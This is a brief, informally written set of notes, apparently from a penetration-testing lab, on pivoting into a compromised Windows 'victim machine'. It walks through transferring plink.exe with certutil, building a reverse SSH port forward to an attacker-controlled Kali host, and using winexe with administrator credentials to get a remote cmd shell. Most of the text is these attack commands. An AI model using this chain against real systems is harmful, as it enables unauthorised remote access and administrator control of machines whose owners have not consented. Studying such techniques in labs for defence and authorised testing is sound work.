Use the netstat commad to find the ports which are publicly available so that we can use port forward. 

PLink is a command line interface for puTTY back end. 

Download the plink.exe to the kali linux and then transfer it to victim machine using certutil 

restart the ssh server on kali machine 

Now to forward the port run this command on windows machine 

plink.exe -l <username> -pw <password> -R <localport>:127.0.0.1<remoteport> <remoteIP> 

we are forwarding the only internal port that are available for us 

root@kali:~# this pompt us back 

Now we will use a tool called winexe 

Winexe is a linux based application which eill allow us to execute commands on a windows system. 

root@kali:~# winexe -U <username_of_administrator_of_Windows_machine>%<password> //127.0.0.1 "cmd.exe"

run this command 2/3 times until we not get a cmd shell
